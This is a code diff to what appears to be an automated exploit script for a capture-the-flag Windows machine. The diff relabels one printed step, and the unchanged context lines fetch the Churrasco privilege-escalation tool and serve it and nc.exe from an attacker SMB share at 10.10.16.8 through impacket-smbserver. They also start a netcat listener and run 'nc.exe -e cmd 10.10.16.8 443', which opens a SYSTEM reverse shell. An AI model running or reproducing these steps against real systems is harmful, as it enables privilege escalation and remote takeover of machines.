@@ -124,7 +124,7 @@ def administrator_user_content():
     commands_send("wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe");cm.sleep(2)
     print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "cd C:\Windows\Temp");cm.sleep(.5)
     print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "copy \\10.10.16.8\smbFolder\churrasco.exe");cm.sleep(.5)
-    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
+    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Linux > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
     print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + '.\churrasco.exe "\\10.10.16.8\smbFolder\\nc.exe -e cmd 10.10.16.8 443"');cm.sleep(.5)
     print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "copy \\10.10.16.8\smbFolder\\nc.exe");cm.sleep(.5)
     commands_send("sudo impacket-smbserver smbFolder $(pwd)")
